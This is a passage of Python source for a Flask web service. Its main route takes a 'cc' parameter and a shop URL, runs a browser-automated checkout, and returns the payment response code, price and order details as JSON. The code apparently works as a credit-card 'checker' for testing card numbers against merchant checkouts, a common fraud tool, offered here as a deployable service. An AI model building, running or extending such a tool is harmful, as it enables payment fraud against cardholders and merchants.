                extracted_code, extracted_typename = extract_code_underscore_priority(
                    all_codes, all_typenames, excluded_codes
                )
                
                if extracted_code:
                    result_code = extracted_code
                    result_typename = extracted_typename if extracted_typename else found_typename
                elif all_typenames:
                    result_code = all_typenames[0]
                    result_typename = all_typenames[0]
                else:
                    result_code = None
                    result_typename = None
            
            if result_code:
                return {
                    "success": True,
                    "code": result_code,
                    "typename": result_typename,
                    "response": response_result,
                    "price": total_amount,
                    "order_number": order_number,
                    "checkout_url": checkout_url,
                    "final_url": final_url,
                    "error": None
                }
            else:
                return {
                    "success": False,
                    "code": None,
                    "typename": None,
                    "response": None,
                    "price": total_amount,
                    "order_number": None,
                    "checkout_url": checkout_url,
                    "final_url": final_url,
                    "error": "Code not found"
                }
        
        except Exception as e:
            if driver:
                driver.quit()
            return {
                "success": False,
                "code": None,
                "typename": None,
                "response": None,
                "price": total_amount,
                "order_number": None,
                "checkout_url": checkout_url,
                "final_url": None,
                "error": str(e)
            }
    
    except Exception as e:
        if driver:
            driver.quit()
        return {
            "success": False,
            "code": None,
            "typename": None,
            "response": None,
            "price": total_amount,
            "order_number": None,
            "checkout_url": checkout_url,
            "final_url": None,
            "error": str(e)
        }

# ==================== Routes ====================
@app.route('/', methods=['GET'])
def home():
    cc = request.args.get('cc')
    url = request.args.get('url')
    
    if not cc or not url:
        return jsonify({
            "success": False,
            "code": None,
            "typename": None,
            "response": None,
            "price": None,
            "order_number": None,
            "checkout_url": None,
            "final_url": None,
            "error": "Missing cc or url parameters"
        })
    
    result = ff(cc, url)
    return jsonify(result)

@app.route('/health', methods=['GET'])
def health():
    return jsonify({"status": "ok"})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port, threaded=True)
